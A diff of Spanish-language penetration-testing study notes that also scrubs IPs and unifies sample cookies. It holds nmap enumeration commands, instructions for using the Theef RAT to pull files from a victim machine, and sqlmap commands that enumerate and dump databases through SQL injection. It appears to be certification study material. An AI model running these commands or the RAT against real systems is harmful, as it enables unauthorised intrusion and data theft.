@@ -161,7 +161,7 @@ nmap -sn [ip] (solo chequea si el host esta UP)
 nmap -Pn --script vuln [ip] --> EoL
 
 ```
-Una vez que enumeraste todos los hosts activos en un segmento, en caso de que no lo hayas hecho ya, enumera los servicios y puertos abiertos en cada una de las maquinas que estan activas, puedes pasarle un .txt con las IP, una por linea, con el siguiente comando: (WAMP Server tiene activo puerto 80 y 3306 MySQL, 172.20.0.16)
+Una vez que enumeraste todos los hosts activos en un segmento, en caso de que no lo hayas hecho ya, enumera los servicios y puertos abiertos en cada una de las maquinas que estan activas, puedes pasarle un .txt con las IP, una por linea, con el siguiente comando: 
 ```
 nmap -sV -iL [archivo.txt] 
 ```
@@ -237,7 +237,6 @@ echo %COMPUTERNAME%.%USERDNSDOMAIN% (en Windows)
 hostname --fqdn (en Linux)
 
 nmap -sS -v -p 445,139 --script smb-os-discovery [Target]
-nmap -sS -v -p 3389 --open --script *-ntlm-info [10.10.0.18] --script-timeout=60s
 nmap -sS -v -p 389 --open --script *-ntlm-info [TARGET] --script-timeout=60s
 
 nmap -p 389 –sV [ip red] -Pn (encuentra que host en una subred tiene LDAP activo)
@@ -336,7 +335,7 @@ Para EntryPoint, hash, entropia, etc: **DIE** --> Subir el archivo, escanear, y 
 Si te dan un archivo sin extension, se utiliza programa HxD, se carga el archivo en el programa y se ven los primeros bits hexadecimales, se busca en el Wikipedia (https://en.wikipedia.org/wiki/List_of_file_signatures) que tipo de archivo es, y se agrega la extension para poder meterlo en el DIE. 
 
 Para **RAT** --> **Theef** El servidor se instala en la victima y el cliente es lo que controla el RAT. Permite las conexiones a traves del puerto 9871. El puerto en la interfaz del cliente se deja por defecto: 6703 (e-design-web) y FTP 2968 (enpp). 
-nmap -p 6703,2968 192.168.222.0/24
+nmap -p 6703,2968
 
 En el cliente, es necesario que en la opcion "Local Options" --> "Client Settings" se coloca la direccion del directorio local la ruta de la carpeta donde esta instalado theef, luego en File Search o File Manager, se coloca la ruta del archivo como C:\ y donde esta la extension se coloca el nombre.extension del archivo a buscar, se da doble clic o clic derecho y "Download file", se descargara en la ruta que se coloco como directorio local. 
 
@@ -423,13 +422,13 @@ CON REQUEST DE BURPSUITE, despues de obtener la URL vulnerable con OWASP ZAP (PR
 sqlmap -r [archivo.txt] --dbs 
 
 CHEQUEA NOMBRES DE LAS BASES DE DATOS
-sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="PHPSESSID=ykPje8QB; security=low" --dbs
+sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low" --dbs
 
 CHEQUEA LAS TABLAS DE LA BASE DE DATOS
-sqlmap -u "http://domain.com/path.aspx?id=1" --cookie="PHPSESSID=abc123xdfhiounoi; security=low" -D [database_name] --tables
+sqlmap -u "http://domain.com/path.aspx?id=1" --cookie="PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low" -D [database_name] --tables
 
 CHEQUEA LAS COLUMNAS DE LA TABLA
-sqlmap -u "http://domain.com/path.aspx?id=1" --cookie="PHPSESSID=1tmgthfok042dsltsmbnvkwj2387; security=low" -D [database_name] -T [target_Table] --columns
+sqlmap -u "http://domain.com/path.aspx?id=1" --cookie="PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low" -D [database_name] -T [target_Table] --columns
 
 DUMPEAR TODOS LOS VALORES DE LA TABLA
 sqlmap -u "http://domain.com/path.aspx?id=1" --cookie="PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low" -D [database_name] -T [target_Table] --dump
